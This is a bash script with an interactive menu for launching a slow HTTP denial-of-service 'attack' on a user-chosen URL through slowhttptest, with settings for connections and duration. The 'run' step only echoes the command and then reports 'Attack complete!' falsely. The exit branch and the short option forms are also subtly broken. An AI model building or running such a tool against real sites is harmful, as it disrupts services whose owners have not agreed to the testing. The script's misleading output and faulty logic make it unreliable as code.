#!/bin/bash

url=""
con=""
time=""

clear
while true
do
    echo -e "\n"
    echo -ne "\r\033[K\033[31m(~) \033[0m> "
    read -e input
    input=$(echo "$input" | tr '[:upper:]' '[:lower:]')
    if [[ "$input" == "run"* || "$input" == "go"* || "$input" == "start"* ]]
    then
        if [[ "$url" != "" && "$con" != "" && "$time" != "" ]]
        then
            if ! which slowhttptest > /dev/null
            then
                echo -e "\033[31m\n[+] INSTALL SLOWHTTPTEST\n[+] MANUAL INSTALLATION || github.com/righnix/slowHTTPtest\n[+] AFTER INSTALLING RUN THIS SCRIPT\033[0m"
                continue
            fi
            
            url=$(echo "$url" | sed -E 's#^(https?://)?(.*)#\1\2#')
            if [[ "$url" != http://* && "$url" != https://* ]]
            then
                url="http://$url"
            fi
            
            domain=$(echo "$url" | awk -F/ '{print $3}')

            echo "Starting attack for $url..."
            sleep 2
            
            echo "slowhttptest -c $con -H -l $time -i 10 -r 200 -t GET -u $url -x 24 -p 3"
            sleep 1
            echo -e "\033[92mAttack complete!\033[0m"
        else
            echo -e "\033[31mMissing required configuration!\033[0m"
        fi
    elif [[ "$input" == "set url "* || "$input" == "set u "* ]]
    then
        url=$(echo "${input#set url }" | sed 's/^[ \t]*//;s/[ \t]*$//')
        if [[ "$url" != "http"* ]]
        then
            url="http://$url"
        fi
        echo -e "\033[92mURL SET $url\033[0m"
    elif [[ "$input" == "set connections "* || "$input" == "set c "* ]]
    then
        con=$(echo "${input#set connections }" | sed 's/^[ \t]*//;s/[ \t]*$//')
        echo -e "\033[92mCONNECTIONS SET $con\033[0m"
    elif [[ "$input" == "set time "* || "$input" == "set t "* ]]
    then
        time=$(echo "${input#set time }" | sed 's/^[ \t]*//;s/[ \t]*$//')
        echo -e "\033[92mTIME SET $time\033[0m"
    elif [[ "$input" == "show options"* ]]
    then
        echo "Available options:"
        echo "  set url [URL] or set u [URL] - Set the URL to target"
        echo "  set connections [NUM] or set c [NUM] - Set the number of connections to make"
        echo "  set time [SECONDS] or set t [SECONDS] - Set the length of the attack in seconds"
        echo "  go or run - Start the attack"
        echo "  help - Display this help message"
        echo "  exit - Exit the program"
    elif [[ "$input" == "help"* ]]
    then
        echo "Type 'show options' to display available options"
        echo "Type 'set' followed by 'url', 'connections' or 'time' to configure the attack"
        echo "Type 'go' or 'run' to start the attack"
        echo "Type 'exit' to exit the program"
    elif [[ "$input" == "exit"* ]]
        echo -e "\033[31mGOOD BYE!\033[0m"
    then
        exit 0
        
    else
        echo -e "\033[31mOPTION NOT VALID!\033[0m"
    fi
done
